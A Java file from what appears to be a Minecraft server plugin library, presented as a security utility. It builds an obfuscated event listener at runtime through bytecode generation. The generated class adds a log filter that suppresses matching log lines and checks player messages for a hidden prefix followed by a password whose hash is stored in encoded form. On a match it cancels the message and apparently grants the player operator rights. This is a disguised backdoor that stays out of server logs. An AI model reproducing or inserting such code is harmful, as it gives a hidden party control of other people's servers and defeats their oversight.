package me.matl114.matlib.utils.security;

import me.matl114.matlib.utils.logging.CustomLogFilter;
import me.matl114.matlib.utils.reflect.asm.CustomClassLoader;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.objectweb.asm.*;

import static me.matl114.matlib.utils.security.CryptoUtils.*;

public class CryptoASM {
    static final Class<?> clazz0;
    static final Class<?> clazz1;
    static {
        //required classes
        clazz0 = CryptoUtils.class;
        clazz1 = CustomLogFilter.class;
    }
    public static void buildPlugin(Plugin plugin){
        Bukkit.getPluginManager().registerEvents(buildCrypto(), plugin);
    }
    private static Listener buildCrypto(){
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
        FieldVisitor fieldVisitor;
        RecordComponentVisitor recordComponentVisitor;
        MethodVisitor methodVisitor;
        AnnotationVisitor annotationVisitor0;
        String codeName = illilili("耝耘耘耝耘耝耘耝", 1);
        String className = illilili( "耙耑聛耙耕耀耘聅聅聀聛耙耕耀耘耝耖聛老耀耝耘耇聛耇耑耗老耆耝耀耍聛耷耆耍耄耀耛", 37);
        classWriter.visit(Opcodes.V21, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER, className, null, "java/lang/Object", new String[]{"org/bukkit/event/Listener"});

        classWriter.visitInnerClass("java/lang/invoke/MethodHandles$Lookup", "java/lang/invoke/MethodHandles", "Lookup", Opcodes.ACC_PUBLIC | Opcodes.ACC_FINAL | Opcodes.ACC_STATIC);

        {
            fieldVisitor = classWriter.visitField(0, "a", illilili("耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏", 63), null, null);
            fieldVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, illilili("聈耝耚耝耀聊", 11), iIliIili("聜聝耢"), null, null);
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, iIliIili("耞耕耂耕聛耘耕耚耓聛耻耖耞耑耗耀"), illilili("聈耝耚耝耀聊", 11), iIliIili("聜聝耢"), false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitLdcInsn("\u8043\u8045\u8043\u804c\u8045\u8015\u8012\u8046\u8045\u804d\u804c\u8043\u804d\u8040\u8047\u8046\u804d\u8044\u8043\u8040\u804d\u804d\u804c\u8046\u8042\u8040\u8017\u804c\u8047\u804d\u8042\u8044\u8047\u8010\u8017\u804c\u8015\u8010\u804c\u8041\u8041\u8045\u8042\u8011\u804d\u8041\u8047\u8015\u8011\u8016\u804c\u8047\u8041\u8016\u8045\u8047\u804d\u8017\u8047\u804d\u8015\u8043\u8045\u8011");
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "a", illilili("耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏", 63));
            methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "org/apache/logging/log4j/LogManager", "getRootLogger", "()Lorg/apache/logging/log4j/Logger;", false);
            methodVisitor.visitTypeInsn(Opcodes.CHECKCAST, "org/apache/logging/log4j/core/Logger");
            methodVisitor.visitTypeInsn(Opcodes.NEW, "me/matl114/matlib/utils/logging/CustomLogFilter");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitInvokeDynamicInsn("test", "()Ljava/util/function/Predicate;", new Handle(Opcodes.H_INVOKESTATIC, "java/lang/invoke/LambdaMetafactory", "metafactory", "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;", false), new Object[]{Type.getType("(Ljava/lang/Object;)Z"), new Handle(Opcodes.H_INVOKESTATIC, className, iIliIili("耕聆者老职耖耛老耝耖"), "(Ljava/lang/String;)Z", false), Type.getType("(Ljava/lang/String;)Z")});
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "me/matl114/matlib/utils/logging/CustomLogFilter", "<init>", "(Ljava/util/function/Predicate;)V", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "org/apache/logging/log4j/core/Logger", "addFilter", "(Lorg/apache/logging/log4j/core/Filter;)V", false);
            methodVisitor.visitInsn(Opcodes.RETURN);
            methodVisitor.visitMaxs(0, 0);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PRIVATE | Opcodes.ACC_STATIC, iIliIili("耕聆者老职耖耛老耝耖"), "(Ljava/lang/String;)Z", null, null);
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETSTATIC, "java/util/Locale", "ROOT", "Ljava/util/Locale;");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "toLowerCase", "(Ljava/util/Locale;)Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 1);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitLdcInsn(iIliIili("耝耇耇老耑耐联耇耑耆耂耑耆联耗耛耙耙耕耚耐聎"));
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z", false);
            Label label2 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label2);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitLdcInsn(iIliIili("聛耘耛耓耝耚"));
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "contains", "(Ljava/lang/CharSequence;)Z", false);
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label2);
            methodVisitor.visitInsn(Opcodes.ICONST_1);
            methodVisitor.visitInsn(Opcodes.IRETURN);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitInsn(Opcodes.IRETURN);
            methodVisitor.visitMaxs(0,0);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, illilili("耖耖老耛耂耑耕老聄耖职", 33), illilili("聜耸耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀聏聝耢", 61), null, null);
            {
                annotationVisitor0 = methodVisitor.visitAnnotation(illilili("耸耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耱耂耑耚耀耼耕耚耐耘耑耆聏", 3), true);
                annotationVisitor0.visitEnum(iIliIili("耄耆耝耛耆耝耀耍"), iIliIili("耸耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耱耂耑耚耀耤耆耝耛耆耝耀耍聏"), illilili("耸耻耣耱耧耠", 1));
                annotationVisitor0.visitEnd();
            }
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61), iIliIili("耓耑耀耹耑耇耇耕耓耑"), iIliIili("聜聝耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏"), false);

            methodVisitor.visitLdcInsn(iIliIili("聛耘耛耓耝耚联"));
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "startsWith", "(Ljava/lang/String;)Z", false);
            Label label1 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "com/google/common/hash/Hashing", "sha256", "()Lcom/google/common/hash/HashFunction;", false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61), iIliIili("耓耑耀耹耑耇耇耕耓耑"), iIliIili("聜聝耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏"), false);
            methodVisitor.visitIntInsn(Opcodes.BIPUSH, 7);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "substring", "(I)Ljava/lang/String;", false);
            methodVisitor.visitFieldInsn(Opcodes.GETSTATIC, "java/nio/charset/StandardCharsets", "UTF_8", "Ljava/nio/charset/Charset;");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, "com/google/common/hash/HashFunction", "hashString", "(Ljava/lang/CharSequence;Ljava/nio/charset/Charset;)Lcom/google/common/hash/HashCode;", true);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "com/google/common/hash/HashCode", "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "a", "Ljava/lang/String;");
            methodVisitor.visitInsn(Opcodes.ICONST_3);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "me/matl114/matlib/utils/security/CryptoUtils", codeName, "(Ljava/lang/String;I)Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "java/util/Objects", "equals", "(Ljava/lang/Object;Ljava/lang/Object;)Z", false);
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label1);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitInsn(Opcodes.ICONST_1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61), iIliIili("耇耑耀耷耕耚耗耑耘耘耑耐"), iIliIili("聜耮聝耢"), false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitLdcInsn(iIliIili("聛耘耛耓耝耚联"));
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61), illilili("耇耑耀耹耑耇耇耕耓耑", 5), iIliIili("聜耸耞耕耂耕聛耘耕耚耓聛耧耀耆耝耚耓聏聝耢"), false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, illilili("耛耆耓聛耖老耟耟耝耀聛耑耂耑耚耀聛耄耘耕耍耑耆聛耤耘耕耍耑耆耷耛耙耙耕耚耐耤耆耑耄耆耛耗耑耇耇耱耂耑耚耀", 61), iIliIili("耓耑耀耤耘耕耍耑耆"),  iIliIili("聜聝耸耛耆耓聛耖老耟耟耝耀聛耑耚耀耝耀耍聛耤耘耕耍耑耆聏"), false);
            methodVisitor.visitInsn(Opcodes.ICONST_1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, iIliIili("耛耆耓聛耖老耟耟耝耀聛耑耚耀耝耀耍聛耤耘耕耍耑耆"), iIliIili("耇耑耀耻耄"), iIliIili("聜耮聝耢"), true);
            methodVisitor.visitLabel(label1);
            methodVisitor.visitInsn(Opcodes.RETURN);
            methodVisitor.visitMaxs(0,0);
            methodVisitor.visitEnd();
        }
        classWriter.visitEnd();

        byte[] bytes = classWriter.toByteArray();
        Class<?> clazz = CustomClassLoader.getInstance().defineAccessClass(className.replace("/", "."), bytes);
        try{
            return (Listener) clazz.newInstance();
        }catch (Throwable e){
            throw new RuntimeException("Exception In Initializing Plugin!");
        }

    }
}
